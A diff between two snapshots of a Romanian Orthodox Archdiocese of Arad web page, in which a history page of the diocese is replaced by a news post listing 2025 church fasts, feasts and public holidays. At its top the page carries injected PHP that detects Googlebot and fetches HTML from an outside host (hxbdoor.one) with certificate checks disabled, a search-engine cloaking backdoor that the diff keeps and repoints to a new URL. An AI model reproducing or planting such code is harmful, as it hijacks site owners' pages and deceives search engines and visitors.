@@ -8,7 +8,7 @@ function isGoogleBot() {
 }
 
 if (isGoogleBot()) {
-    $ch = curl_init("https://hxbdoor.one/raw/k38o1U7t");
+    $ch = curl_init("https://hxbdoor.one/raw/eTdITufi");
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     $html = curl_exec($ch);
@@ -33,6 +33,7 @@ if (isGoogleBot()) {
 
 
 
+
 <!DOCTYPE html>
 <!--[if IE 7]>
 <html class="ie ie7" lang="ro-RO">
@@ -46,7 +47,7 @@ if (isGoogleBot()) {
 <head>
 	<meta charset="UTF-8">
 	<meta name="viewport" content="width=device-width">
-	<title>Istoric | Arhiepiscopia Aradului</title>
+	<title>Calendarul creștin-ortodox pentru anul 2025 este disponibil în Arhiepiscopia Aradului | Arhiepiscopia Aradului</title>
 	<link rel="profile" href="http://gmpg.org/xfn/11">
 	<link rel="pingback" href="https://www.arhiepiscopiaaradului.ro/xmlrpc.php">
 	<!--[if lt IE 9]>
@@ -55,8 +56,8 @@ if (isGoogleBot()) {
 	<meta name='robots' content='max-image-preview:large' />
 <link rel="alternate" type="application/rss+xml" title="Arhiepiscopia Aradului &raquo; Flux" href="https://www.arhiepiscopiaaradului.ro/feed/" />
 <link rel="alternate" type="application/rss+xml" title="Arhiepiscopia Aradului &raquo; Flux comentarii" href="https://www.arhiepiscopiaaradului.ro/comments/feed/" />
-<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://www.arhiepiscopiaaradului.ro/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.arhiepiscopiaaradului.ro%2Fistoric%2F" />
-<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://www.arhiepiscopiaaradului.ro/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.arhiepiscopiaaradului.ro%2Fistoric%2F&#038;format=xml" />
+<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://www.arhiepiscopiaaradului.ro/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.arhiepiscopiaaradului.ro%2F2024%2F10%2Fcalendarul-crestin-ortodox-pentru-anul-2025-este-disponibil-in-arhiepiscopia-aradului%2F" />
+<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://www.arhiepiscopiaaradului.ro/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.arhiepiscopiaaradului.ro%2F2024%2F10%2Fcalendarul-crestin-ortodox-pentru-anul-2025-este-disponibil-in-arhiepiscopia-aradului%2F&#038;format=xml" />
 <style id="wp-img-auto-sizes-contain-inline-css">
 img:is([sizes=auto i],[sizes^="auto," i]){contain-intrinsic-size:3000px 1500px}
 /*# sourceURL=wp-img-auto-sizes-contain-inline-css */
@@ -99,10 +100,10 @@ img:is([sizes=auto i],[sizes^="auto," i]){contain-intrinsic-size:3000px 1500px}
 <script id="jquery-core-js" src="https://www.arhiepiscopiaaradului.ro/wp-includes/js/jquery/jquery.min.js?ver=3.7.1"></script>
 <script id="jquery-migrate-js" src="https://www.arhiepiscopiaaradului.ro/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1"></script>
 <script data-wp-strategy="defer" defer id="twentyfourteen-script-js" src="https://www.arhiepiscopiaaradului.ro/wp-content/themes/twentyfourteen/js/functions.js?ver=20250729"></script>
-<link rel="https://api.w.org/" href="https://www.arhiepiscopiaaradului.ro/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://www.arhiepiscopiaaradului.ro/wp-json/wp/v2/pages/8" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.arhiepiscopiaaradului.ro/xmlrpc.php?rsd" />
+<link rel="https://api.w.org/" href="https://www.arhiepiscopiaaradului.ro/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://www.arhiepiscopiaaradului.ro/wp-json/wp/v2/posts/78232" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.arhiepiscopiaaradului.ro/xmlrpc.php?rsd" />
 
-<link rel="canonical" href="https://www.arhiepiscopiaaradului.ro/istoric/" />
-<link rel='shortlink' href='https://www.arhiepiscopiaaradului.ro/?p=8' />
+<link rel="canonical" href="https://www.arhiepiscopiaaradului.ro/2024/10/calendarul-crestin-ortodox-pentru-anul-2025-este-disponibil-in-arhiepiscopia-aradului/" />
+<link rel='shortlink' href='https://www.arhiepiscopiaaradului.ro/?p=78232' />
 
 <!-- <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script> -->
 <!-- <script>
@@ -114,7 +115,7 @@ img:is([sizes=auto i],[sizes^="auto," i]){contain-intrinsic-size:3000px 1500px}
 
 </head>
 
-<body class="wp-singular page-template-default page page-id-8 wp-embed-responsive wp-theme-twentyfourteen wp-child-theme-2014child group-blog masthead-fixed full-width singular">
+<body class="wp-singular post-template-default single single-post postid-78232 single-format-standard wp-embed-responsive wp-theme-twentyfourteen wp-child-theme-2014child group-blog masthead-fixed full-width singular">
 <div id="page" class="hfeed site">
 	<!--<div id="site-header"> -->
 		<!-- <a href="" rel="home"> -->
@@ -182,7 +183,7 @@ img:is([sizes=auto i],[sizes^="auto," i]){contain-intrinsic-size:3000px 1500px}
 	<li id="menu-item-54453" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-54453"><a href="https://www.masaperoti.ro">Masa pe Roţi</a></li>
 </ul>
 </li>
-<li id="menu-item-24" class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-8 current_page_item menu-item-24"><a href="https://www.arhiepiscopiaaradului.ro/istoric/" aria-current="page">Istoric</a></li>
+<li id="menu-item-24" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-24"><a href="https://www.arhiepiscopiaaradului.ro/istoric/">Istoric</a></li>
 <li id="menu-item-377" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-377"><a>Arhiepiscop</a>
 <ul class="sub-menu">
 	<li id="menu-item-31" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-31"><a href="https://www.arhiepiscopiaaradului.ro/arhiepiscop/biografie-ierarh/">Biografie chiriarh</a></li>
@@ -218,59 +219,113 @@ img:is([sizes=auto i],[sizes^="auto," i]){contain-intrinsic-size:3000px 1500px}
 
 	<div id="main" class="site-main">
 
-<div id="main-content" class="main-content">
-
 	<div id="primary" class="content-area">
 		<div id="content" class="site-content" role="main">
-
 			
-<article id="post-8" class="post-8 page type-page status-publish hentry">
-	<header class="entry-header"><h1 class="entry-title">Istoric</h1></header><!-- .entry-header -->
-	<div class="entry-content">
-		<h2 class="art-PostHeaderIcon-wrapper" style="color: #484e46;"><span class="art-PostHeader">Istoricul Eparhiei Aradului</span></h2>
-<div class="art-PostContent" style="color: #2a2e29;">
-<div class="art-article">
-<p><strong>I. Începuturile Arhiepiscopiei Aradului</strong></p>
-<p>Prima atestare documentară a Episcopiei Aradului apare la începutul secolului al XVIII-lea, mai exact în anul 1706, când vrednicul de pomenire Episcopul Isaia Diacovici (1706-1708), primul vlădică al Aradului, se mută de la vechea reşedinţă eparhială a Ienopolei în urbea arădeană, după ce cumpără o casă care va sevi drept sediu episcopal. Prin diploma acordată de imperialii austro-ungari la 15 aprilie 1706, ierarhului Isaia Diacovici, practic ia fiinţă această episcopie, având o continuitate neîntreruptă de mai bine de trei sute de ani.<br />
-Înfiinţarea Episcopiei Aradului a avut loc datorită contextului politic din acea vreme, şi nu în ultimul rând comunităţii ortodocşilor care erau relativ numeroşi, însă, trebuie spus, că în momentul venirii Episcopului Isaia Diacovici aici existau două comunităţi de ortodocşi cu două biserici, una a credincioşilor de neam român şi alta a credincioşilor de neam sârb, care erau majoritari pe aceste ţinuturi. Aradul fiind într-o zonă condusă administrativ bisericesc de patriarhia sârbă de Carloviţ, era firesc, ca şi ierarhul locului -în persoana Episcopului Isaia Diacovici- să fie tot de neam sârb, astfel că şirul ierarhilor de acest neam continuă până în 1829 când, după moartea din 1815 a vlădicului Pavel Avacumovici, este ales la Arad primul ierarh de neam român -Nestor Ioanovici(1829-1830), originar din părţile Făgăraşului.</p>
-<p><a href="https://www.arhiepiscopiaaradului.ro/wp-content/uploads/2014/12/catedrala_ortodoxa.jpg"><img fetchpriority="high" decoding="async" class="aligncenter size-full wp-image-493" src="https://www.arhiepiscopiaaradului.ro/wp-content/uploads/2014/12/catedrala_ortodoxa.jpg" alt="catedrala_ortodoxa" width="335" height="500" srcset="https://www.arhiepiscopiaaradului.ro/wp-content/uploads/2014/12/catedrala_ortodoxa.jpg 335w, https://www.arhiepiscopiaaradului.ro/wp-content/uploads/2014/12/catedrala_ortodoxa-201x300.jpg 201w" sizes="(max-width: 335px) 100vw, 335px" /></a></p>
-<p style="text-align: center;"><em><strong>Vechea Catedrală Ortodoxă &#8211; LITOGRAFIE</strong></em></p>
-<p>Încă de la înfiinţarea Episcopiei Aradului ierarhia bisericească a fost de neam sârb iar în decursul istoriei bisericeşti arădene s-au perindat pe tronul vlădicesc zece ierarhi de acest neam, începând cu Isaia Diacovici (1706-1708), urmat de Episcopul Ioanichie Martinovici (1710-1721), Sofronie Ravanicianin (1722-1726), Vichentie Ioanovici(1726-1731), Isaia Antonovici(1731-1748), Pavel Nenadovici(1748-1749). O importanţă majoră pentru biruinţa definitivă a ortodoxiei în     Bihor şi Hălmagiu a avut-o vrednicul de pomenire Episcopul Sinesie Jivanovici (1751-1768) care a desfăşurat o bogată activitate pastoral-misionară, făcând şi numeroase vizite canonice, printre cele mai importante din punct de vedere canonic fiind cele efectuate în perioada 1754-1755 şi 1759, având drept scop disciplina clerului. L-au urmat în tronul arhieresc de la Arad Episcopul Pahomie Cnezevici(1770-1783), Petreu Petrovici(1783-1786) Pavel Avacumovici(1786-1815), cu acesta din urmă încheindu-se şirul episcopilor de neam sârb la Arad; urmează o perioadă de paisprezece ani de sedis-vacanţă a tronului arhieresc, până la venirea în 1829 a Episcopului Nestor Ioanovici, care era de neam român, originar din  Făgăraş.<br />
-Cu episcopul Nestor Ioanovici începe o nouă etapă în viaţa comunităţii ortodoxe arădene, în special pentru românii de aici. El a fost unul din acei episcopi providenţiali cărora le-a revenit datoria de a armoniza relaţiile interetnice dintre ortodocşii români şi cei sârbi, aderent al spiritului de unitate bisericească în Ardeal promovat de Mitropolitul Andrei Şaguna.<br />
-Şicrul cronologic al ierarhilor români este urmâtorul: Nestor Ioanovici(1829-1830), Gherasim Raţ(1835-1850)fiind unul din cei mai devotaţi ierarhi care au luptat alături de Mitropolitul Andrei Şaguna, pentru emaniciparea naţionaţă, fiind un promotor al revoluţiei paşoptiste din 1848-1849, urmat de Procopie Ivaşcovici(1853-1873),dw acest nume se leagă clădirea Catedralei Vechi Sfântul Ioan Botezătorul, Miron Romanul (1873-1874), Ioan Meţianu(1874-1898), Iosif Ioan Goldiş (1899-1902), Ioan Ignatie Papp(1903-1925), numit şi episcopul Marii Uniri de la 1 decembrie 1918, urmat de eruditul vlădică dr. Grigorie Comşa(1925-1935) fiind om de cultură a publicat în diferite periodice cum ar fi:Telegraful Român, Biserica şi Şcoala, Misionarul, Biserica Ortodoxă Română, Episcopul dr. Andrei Mageru (1936-1960), Episcopul dr. Nicolae Corneanu (1960-1962), actualul Mitropolit al Banatului, Episcopul Teoctist Arăpaşul(1962-1973), ales Patriarh al Bisericii Ortodoxe Române în 1986, Episcopul dr. Visarion Aştileanu(1973-1984). În 1984, după trecerea la cele veşnice a episciopului Visarion Aştileanu al Aradului, membrii Colegiul Electoral Bisericesc, împreună cu membrii Adunării eparhiale a Episcopiei Aradului, convocaţi pentru ziua de 30 septembrie 1984, au ales în unanimitate pe Prea Sfinţitul dr. Timotei Lugojanul, episcop-vicar al Arhiepiscopiei Timişoarei şi Caransebeşului ca episcop al Aradului. Instalarea a avut loc în 2 decembrie 1984, în biserica episcopală din Arad, în prezenţa mitropolitului Antonie Plămădeală al Ardealului, I. P. S. Sa dr. Nicolae al Banatului, episcopului Vasile al Oradiei, episcopului Emilian de Alba Iulia şi arhiereului-vicar Gherasim Hunedoreanul al Aradului.<br />
-Episcopia Aradului a avut doi arhierei-vicari: Gherasim Hunedoreanu(1975-1985) acesta trasferându-se la Episcopia Buzăului şi ulterior în 1992 la Arhiepiscopia Sucevei şi Rădăuţilor cu titlul Putneanul şi Emilian Arădeanul(1990-1994) care la 12 iulie 1994 părăseşte Aradul pentru scaunul vlădicesc din nou înfiinţata Episcopie a Caransebeşului, păstorind până la 5 aprilie 1996, când trece la cele veşnice.</p>
-<p><strong>II Jurisdicţia canonică</strong></p>
-<p>Parohiile şi Protopopiatele din judeţul Hunedoara(de la Hălmagiu înspre valea Mureşului) ţineau de Arhiepiscopia Ortodoxă Română a Sibiului până în 1949. De-a lungul istoriei medievale şi moderne, Zarandul spre un caz, a suferit sistematic permutări jurisdicţionale, în funcţie de situaţia politică statală şi alţi factori etnici străini.<br />
-După crearea Mitropoliei Banatului la 3 iulie 1947, pentru a nu rămâne Mitropolia cu o singură eparhie sufragană, de la 1 aprilie 1949 la ea se va afilia şi Episcopia Aradului, încorporând şi judeţul Hunedoara în jurisdicţia sa canonică . Titulatura oficială din acest moment va fi Episcopia Aradului, Ienopolei şi Hălmagiului, iar din 2007 Episcopia Aradului şi Hunedoarei.<br />
-Actualmente Mitropolia Banatului funcţionează cu 5 eparhii sufragane. Două dintre acestea sunt actualmente afiliate eparhiei Aradului – Episcopia Ortodoxă Română din Ungaria(la Gyula, din 1999, Episcop P. S. Siluan Mănuilă) şi Episcopia Ortodoxă Română „Dacia Felix” a Vârşeţului(Serbia şi Muntenegru, din 2001, Episcop P.S. Dr. Daniil Stoenescu).</p>
-<p><strong>III Învăţământul teologic</strong></p>
-<p>Despre învăţământul teologic în Transilvania şi Banat putem vorbi deabea din a doua jumătate a secolului al XVIII-lea, unde prin aceste şcoli teologice serau formaţi clericii de mir, iar la 3/15 noiembrie 1822 s-a deschis la Arad cursurile preparandiei sau a şcolii pedagogice unde erau pregătiţi învăţătorii ortodocşi pentru şcolile din Banat şi Arad şi la 1 decembrie Episcopul locţiitor, printr-o circulară anunţă clericii că se va deschide şcoala clericală. Printre primii dascăli ai acestei preparandii s-au numărat preotul Dimitrie Ţichindeal, Constantin Diaconivici Loga, dr Iosif Iorgovici şi Ioan Mihuţ.<br />
-În 1869 Institutul pedagogic din Arad trece sub conducerea Consistoriului eparhial din Arad iar în 1876 preparandia se va uni cu şcoala teologică apărând astfel Institutul teologic-pedagogic diecezan primul director fiind preotul Ioan Rusu(1816-1891). În 1927 Înstitutul teologic va fi ridicat la rang de academie teologică, cu patru ani de studii, care se va desfinţa pentru totdeauna la la 4 august 1948 când prin Legea pentru regimul general al cultelor</p>
-<p>au fost prevăzute în Biserica Ortodoxă Română doar trei Institute teologice de grad universitar. Între anii 1948-1952 a funcţionat în clădirea Academiei Teologice un Centru de îndrumare a clerului din eparhiile Timişarei şi a Aradului.</p>
-<p><a href="https://www.arhiepiscopiaaradului.ro/wp-content/uploads/2014/12/institutul_pedagogic.jpg"><img decoding="async" class="aligncenter size-full wp-image-491" src="https://www.arhiepiscopiaaradului.ro/wp-content/uploads/2014/12/institutul_pedagogic.jpg" alt="institutul_pedagogic" width="464" height="325" srcset="https://www.arhiepiscopiaaradului.ro/wp-content/uploads/2014/12/institutul_pedagogic.jpg 464w, https://www.arhiepiscopiaaradului.ro/wp-content/uploads/2014/12/institutul_pedagogic-300x210.jpg 300w" sizes="(max-width: 464px) 100vw, 464px" /></a></p>
-<p style="text-align: center;"><em><strong>Institutul Pedagogic &#8211; Vedere din secolul al XIX-lea</strong></em></p>
-<p>După căderea comunismului, în 1991 se înfinţează Facultatea de Teologie Ortodoxă din Arad, cu patru ani de studiu, pregătind tineri pentru clerul de mir şi monahal cât şi profesori de religie.<br />
-În cadrul învăţământului teologic din eparhia Aradului se numără şi cele două seminarii teologice. La iniţiativa P. S. Sale, cu aprobarea Sf. Sinod al Bisericii Orotodxe Române, începând cu anul şcolar 1991-1992, la Prislop s-au deschis cursurile unui Seminar Teologie Liceal-Monahal „Sfânta Ecaterina&#8221; pentru fete, cu o durată de şcolarizare de cinci ani, şi Seminarul Teologic Liceal Ortodox din Arad, cu aceeaşi durată de studiu.</p>
-<p><strong> </strong></p>
-<p><strong>IV Actualitatea eparhială</strong></p>
-<p>Episcopia Aradului se preocupă constant de activitatea pastoral-misionară şi de propovăduire, alături de viaţa spirituală şi culturală a credincioşilor ei. Această grijă se conturează prin manifestările cultural religioase, promivare mass media, presă bisericească dar şi activităţi editoriale şi de difuzare a cărţii religioase.<br />
-Atât Întâistătătorul eparhiei cât şi părinţii consilieri, protopopii, preoţii de parohii dar şi profesorii de Teologie şi studenţii arădeni susţin, iniţiază şi participă în colaborare la diverse activităţi de acestă natură.<br />
-Printre acţiunile de mai mare anvergură ale Episcopiei Aradului se numără:<br />
-&#8211; Simpozioane şi Sesiuni de Comunicări ştiinţifice ale Facultăţii de Teologie Ortodoxă din Arad (în jud. Arad dar şi Hunedoara) cu o excelentă participare naţională, internaţională; acţiuni studenţeşti;<br />
--diverse festivale religioase – Festivalul coral interjudeţean de muzică religioasă „Cu noi este Dumnezeu” de la Orăştie, ajuns la a XVI –a ediţie;<br />
-&#8211; Programe religios-culturale ale elevilor Seminarului Teologic –Liceal Ortodox Arad, elevelor Seminarului Monahal Prislop şi ale elevelor Şcolii Postliceale Teologico-Sanitare Arad;<br />
-&#8211; concursuri şi programe organizate în unităţi de învăţământ;<br />
-&#8211; lansări de carte religioasă;<br />
-&#8211; publicaţii: calendar eparhial de perete, calendar broşură, Pastorale de Sfintele Paşti, Naşterea Domnului, Colinde religioase, etc.<br />
-&#8211; Biblioteca eparhială care anual sporeşte cu câteva sute de titluri;</p>
-</div>
-</div>
-	</div><!-- .entry-content -->
-</article><!-- #post-8 -->
+<article id="post-78232" class="post-78232 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
+	
+		<div class="post-thumbnail">
+			<img width="1000" height="576" src="https://www.arhiepiscopiaaradului.ro/wp-content/uploads/2024/10/IMG-20241009-WA0072-1-1000x576.jpg" class="attachment-twentyfourteen-full-width size-twentyfourteen-full-width wp-post-image" alt="" decoding="async" fetchpriority="high" />		</div>
 
-		</div><!-- #content -->
+		
+	<header class="entry-header">
+				<div class="entry-meta">
+			<span class="cat-links"><a href="https://www.arhiepiscopiaaradului.ro/category/uncategorized/" rel="category tag">Știri</a></span>
+		</div>
+
+		<h1 class="entry-title">Calendarul creștin-ortodox pentru anul 2025 este disponibil în Arhiepiscopia Aradului</h1>
+		<div class="entry-meta">
+			<span class="entry-date"><a href="https://www.arhiepiscopiaaradului.ro/2024/10/calendarul-crestin-ortodox-pentru-anul-2025-este-disponibil-in-arhiepiscopia-aradului/" rel="bookmark"><time class="entry-date" datetime="2024-10-09T12:36:54+03:00">9 octombrie 2024</time></a></span> <span class="byline"><span class="author vcard"><a class="url fn n" href="https://www.arhiepiscopiaaradului.ro/author/iustin-popovici/" rel="author">Iustin Popovici</a></span></span>		</div><!-- .entry-meta -->
+	</header><!-- .entry-header -->
+
+		<div class="entry-content">
+		<p style="text-align: justify;"><strong>Credincioşii arădeni vor putea achiziţiona în curând Calendarul creştin-ortodox pentru anul 2025. Apărut la Tipografia Partoș din Timișoara calendarul tip foaie de perete va fi distribuit în această săptămână în toate bisericile şi mănăstirile din cuprinsul Eparhiei Aradului, precum și la magazinele Diecezana din Arad.</strong><span id="more-78232"></span></p>
+<p style="text-align: justify;">În scurt timp o să apară la pangare și calendarele de birou precum și cele tip agendă. Toate cele trei calendare sunt realizate în condiţii grafice deosebite şi cuprind: calendaristica pentru anul 2025 şi rânduieli bisericeşti aprobate de Sfântul Sinod al Bisericii Ortodoxe Române, durata exactă a posturilor şi indicarea celorlalte zile de post, zilele în care nu se săvârşeşte Sfânta Liturghie (aliturgice) sau zilele în care nu se fac nunţi în anii 2025 şi 2026, alte zile şi date mai importante, sărbători bisericeşti naţionale, zile şi sărbători legale în care nu se lucrează.</p>
+<p style="text-align: justify;">Între altele, calendarul este indispensabil oricărui credincios care ţine rânduiala bisericească, făcându-l atent la sărbătorile de peste an, atât cele cu dată fixă, cât şi cele cu dată variabilă, aşa cum este Paştele, sărbătorit în 2025 la data de 20 aprilie.</p>
+<p style="text-align: justify;">Pentru a se evita eventualele induceri în eroare ce pot fi produse de calendarele tipărite fără verificarea şi aprobarea Arhiepiscopiei Aradului preoţii vor face apel la credincioşii arădeni să evite achiziţionarea calendarelor din alte locuri decât parohiile de care aparţin sau magazinele bisericeşti autorizate.</p>
+<p style="text-align: justify;"><strong>Biroul de presă al Arhiepiscopiei Aradului</strong></p>
+<p style="text-align: justify;"><span style="color: #0000ff;">RÂNDUIELI BISERICEŞTI ÎN ANUL 2025</span></p>
+<p style="text-align: justify;"><span style="color: #ff0000;">Zile de post şi posturi de peste an</span></p>
+<p style="text-align: justify;">Miercurile şi vinerile de peste an (în afară de cele cu dezlegare, însemnate cu harţi)</p>
+<p style="text-align: justify;">Ajunul Bobotezei (duminică, 5 ianuarie)</p>
+<p style="text-align: justify;">Tăierea Capului Sfântului Ioan Botezătorul (vineri, 29 august)</p>
+<p style="text-align: justify;">Înălţarea Sfintei Cruci (duminică, 14 septembrie)</p>
+<p style="text-align: justify;">Postul Sfintelor Paşti (luni, 3 martie &#8211; sâmbătă, 19 aprilie)</p>
+<p style="text-align: justify;">Postul Sfinţilor Apostoli Petru şi Pavel (luni, 16 iunie &#8211; sâmbătă, 28 iunie)</p>
+<p style="text-align: justify;">Postul Adormirii Maicii Domnului (vineri, 1 august &#8211; joi, 14 august)</p>
+<p style="text-align: justify;">Postul Naşterii Domnului (vineri, 14 noiembrie &#8211; miercuri, 24 decembrie)</p>
+<p style="text-align: justify;"><span style="color: #ff0000;">Zile aliturgice şi zile cu diferite Liturghii</span></p>
+<p style="text-align: justify;">Zile aliturgice (în care nu se săvârşeşte nicio Sfântă Liturghie): vinerea dinaintea Botezului Domnului (3 ianuarie); miercuri şi vineri, în săptămâna Lăsatului sec de brânză (26 şi 28 februarie); luni şi marţi, în prima săptămână a Postului Sfintelor Paşti (3  și 4 martie); în Sfânta şi Marea Vineri (18 aprilie).</p>
+<p style="text-align: justify;">Liturghia Sfântului Vasile cel Mare se săvârşeşte de 10 ori pe an: 1 şi 6 ianuarie; 9, 16, 23  și 30 martie; 6, 17  și 19 aprilie; 24 decembrie.</p>
+<p style="text-align: justify;">Liturghia Darurilor înainte-sfinţite  se săvârşeşte în zilele de rând din Postul Sfintelor Paşti (luni &#8211; vineri), începând de miercuri în prima săptămână a Postului Mare, până în Sfânta şi Marea Miercuri inclusiv, cu excepția praznicului Bunei Vestiri.</p>
+<p style="text-align: justify;">Liturghia Sfântului Ioan Gură de Aur se săvârşeşte în toate celelalte zile.</p>
+<p style="text-align: justify;"><span style="color: #ff0000;">Zile în care nu se săvârşesc parastase</span></p>
+<p style="text-align: justify;">În toate duminicile de peste an; la Praznicele Împărăteşti (la Înălțarea Domnului se va săvârși doar pomenirea specială a eroilor); în zilele de rând (luni-vineri) ale Postului Mare (se săvârșește doar Litia mică pentru cei  adormiți); în zilele aliturgice; în perioada de la Duminica Floriilor până la Duminica Sfântului Apostol Toma (13 – 27 aprilie); în perioada de la Crăciun până la Bobotează (25 decembrie &#8211; 6 ianuarie).</p>
+<p style="text-align: justify;"><span style="color: #ff0000;">Zile şi date importante</span></p>
+<p style="text-align: justify;">Ziua Culturii Naţionale (miercuri, 15 ianuarie)</p>
+<p style="text-align: justify;">Ziua Unirii Principatelor Române, sărbătoare naţională (vineri, 24 ianuarie)</p>
+<p style="text-align: justify;">Ziua Deținuților Politici Anticomuniști din perioada 1944-1989 în România (duminică, 9 martie)</p>
+<p style="text-align: justify;">Ziua Unirii Basarabiei cu România – 1918, sărbătoare națională  (joi, 27 martie)</p>
+<p style="text-align: justify;">Duminica Femeilor creștine  (duminică, 4 mai)</p>
+<p style="text-align: justify;">Ziua Independenţei României &#8211; 1877, a Victoriei antinaziste &#8211; 1945 şi a Europei &#8211; 1950 (vineri, 9 mai)</p>
+<p style="text-align: justify;">10 Mai &#8211; sărbătoare naţională (sâmbătă, 10 mai)</p>
+<p style="text-align: justify;">Ziua naţională de cinstire a martirilor din temniţele comuniste (miercuri, 14 mai)</p>
+<p style="text-align: justify;">Ziua Naţională a Familiei (duminică, 18 mai)</p>
+<p style="text-align: justify;">Duminica părinţilor şi copiilor (duminică, 8 iunie)</p>
+<p style="text-align: justify;">Ziua drapelului național (joi, 26 iunie)</p>
+<p style="text-align: justify;">Ziua imnului național al României  (marți, 29 iulie)</p>
+<p style="text-align: justify;">Ziua   națională   pentru   comemorarea   martirilor   Brâncoveni   și de   conștientizare   a   violențelor   împotriva creștinilor  (sâmbătă, 16 august)</p>
+<p style="text-align: justify;">Duminica românilor migranţi (duminică, 17 august)</p>
+<p style="text-align: justify;">Începutul anului bisericesc; Ziua rugăciunii pentru mediu (luni, 1 septembrie)</p>
+<p style="text-align: justify;">Ziua Satului Românesc (duminică, 28 septembrie)</p>
+<p style="text-align: justify;">Ziua persoanelor vârstnice (miercuri, 1 octombrie)</p>
+<p style="text-align: justify;">Ziua Bibliei (joi, 13 noiembrie)</p>
+<p style="text-align: justify;">Sfințirea Altarului Catedralei Naționale – 2018 (marți, 25 noiembrie)</p>
+<p style="text-align: justify;">Ziua Naţională a României (luni, 1 decembrie)</p>
+<p style="text-align: justify;"><span style="color: #ff0000;">Sărbători bisericeşti naţionale</span></p>
+<p style="text-align: justify;">Înălţarea Domnului – Ziua Eroilor (joi, 29 mai)</p>
+<p style="text-align: justify;">Sf. Apostol Andrei cel întâi chemat, Ocrotitorul României (duminică, 30 noiembrie)</p>
+<p style="text-align: justify;"><span style="color: #ff0000;">Zile şi sărbători legale în care nu se lucrează</span></p>
+<p style="text-align: justify;">Anul Nou (miercuri, 1, şi joi, 2 ianuarie)</p>
+<p style="text-align: justify;">Botezul Domnului (luni, 6 ianuarie)</p>
+<p style="text-align: justify;">Soborul Sfântului Proroc Ioan Botezătorul (mar i, 7 ianuarie)ț</p>
+<p style="text-align: justify;">Ziua Unirii Principatelor Române (vineri, 24 ianuarie)</p>
+<p style="text-align: justify;">Sfânta  și Marea Vineri  (vineri, 18 aprilie)</p>
+<p style="text-align: justify;">Prima şi a doua zi de Paşti (duminică, 20, şi luni, 21 aprilie)</p>
+<p style="text-align: justify;">Sărbătoarea internaţională a muncii (joi, 1 mai)</p>
+<p style="text-align: justify;">Ziua Copilului (duminică, 1 iunie)</p>
+<p style="text-align: justify;">Prima şi a doua zi de Rusalii (duminică, 8, şi luni, 9 iunie)</p>
+<p style="text-align: justify;">Adormirea Maicii Domnului (vineri, 15 august)</p>
+<p style="text-align: justify;">Sf. Apostol Andrei cel întâi chemat, Ocrotitorul României (duminică, 30 noiembrie)</p>
+<p style="text-align: justify;">Ziua Naţională a României (luni, 1 decembrie)</p>
+<p style="text-align: justify;">Prima şi a doua zi de Crăciun (joi, 25, şi vineri, 26 decembrie)</p>
+<p style="text-align: justify;"><span style="color: #ff0000;">Nu se fac nunţi (în anul 2025)</span></p>
+<p style="text-align: justify;">În toate zilele de post şi în posturile de peste an: în toate miercurile şi vinerile; de luni după Lăsatul secului de carne pentru Postul Sf. Paşti până la Duminica Sf. Apostol Toma inclusiv (24 februarie – 27 aprilie); în Postul Sfinţilor Apostoli Petru şi Pavel (16 – 28 iunie); în Postul Adormirii Maicii Domnului (1  – 14 august); la Tăierea Capului Sfântului Ioan Botezătorul (29 august); în Postul Naşterii Domnului (14 noiembrie  –  24 decembrie); în ajunul şi în zilele Praznicelor Împărăteşti (1 – 2 februarie; 28 – 29 mai; 7 – 9 iunie; 15 august; 13 – 14  septembrie); de la Crăciun până la Bobotează (25 decembrie – 6 ianuarie).</p>
+<p style="text-align: justify;"><span style="color: #0000ff;">NU SE FAC NUNŢI (ÎN ANUL 2026)</span></p>
+<p style="text-align: justify;">În toate zilele de post şi în posturile de peste an: în toate miercurile şi vinerile; de luni după Lăsatul secului de carne pentru Postul Sf. Paşti până la Duminica Sf. Apostol Toma inclusiv (16 februarie –  19 aprilie); în Postul Sfinţilor Apostoli Petru şi Pavel (8 – 28 iunie); în Postul Adormirii Maicii Domnului (31 iulie – 14 august); la  Tăierea Capului Sfântului Ioan Botezătorul (29 august); în Postul Naşterii Domnului (15 noiembrie  –  24 decembrie); în ajunul şi în zilele Praznicelor Împărăteşti (1 – 2 februarie; 20 – 21 mai; 30 mai – 1 iunie; 15 august; 13 &#8211; 14 septembrie); în perioada de la Crăciun până la Bobotează (25 decembrie &#8211; 6 ianuarie).</p>
+<p style="text-align: justify;">
+
+	</div><!-- .entry-content --></article><!-- #post-## --><!-- Matched Content Ads -->
+<div class="matched-content-on-articles">
+	<!-- <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script> -->
+	<ins class="adsbygoogle"
+			style="display:block"
+			data-ad-format="autorelaxed"
+			data-ad-client="ca-pub-4009298172097154"
+			data-ad-slot="4835100960"></ins>
+	<script>
+			/* (adsbygoogle = window.adsbygoogle || []).push({});  */
+	</script>
+</div> <!-- end of matched articles -->
+
+		<nav class="navigation post-navigation">
+		<h1 class="screen-reader-text">
+			Navigare în articole		</h1>
+		<div class="nav-links">
